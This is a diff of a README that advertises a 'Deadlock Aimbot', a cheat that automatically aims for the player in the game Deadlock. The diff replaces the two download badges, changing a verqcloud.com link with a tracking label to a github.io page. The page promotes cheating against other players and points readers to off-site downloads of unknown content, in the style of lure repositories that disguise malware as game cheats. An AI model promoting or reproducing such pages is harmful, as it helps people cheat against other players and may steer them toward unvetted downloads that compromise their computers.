@@ -2,7 +2,7 @@
 
 The **Deadlock Aimbot** is a powerful tool designed to automatically enhance aiming accuracy and reaction times in **Deadlock**. This aimbot provides precision targeting, ensuring that your shots land exactly where they need to, giving you a significant advantage in combat situations. Perfect for players who want to improve their performance, the Deadlock Aimbot adjusts your aim based on target location and movement, allowing you to focus on strategy and positioning while the tool handles your aiming.
 
-[![Download DeadLock AimBot](https://img.shields.io/badge/Download-DeadLock%20AimBot-blueviolet)](https://verqcloud.com?label=09c0d50b1ab5e4e1d163f9d9c8344a8a)
+[![Download DeadLock AimBot](https://img.shields.io/badge/Download-DeadLock%20AimBot-blueviolet)](https://deadlock-aim-bot.github.io/.github/)
 
 ## Features
 
@@ -23,4 +23,4 @@ The **Deadlock Aimbot** is a powerful tool designed to automatically enhance aim
 5. Customize the aimbot settings (sensitivity, FOV, targeting) according to your preference.
 
 
-[![Download DeadLock AimBot](https://img.shields.io/badge/Download-DeadLock%20AimBot-blueviolet)](https://verqcloud.com?label=09c0d50b1ab5e4e1d163f9d9c8344a8a)
+[![Download DeadLock AimBot](https://img.shields.io/badge/Download-DeadLock%20AimBot-blueviolet)](https://deadlock-aim-bot.github.io/.github/)
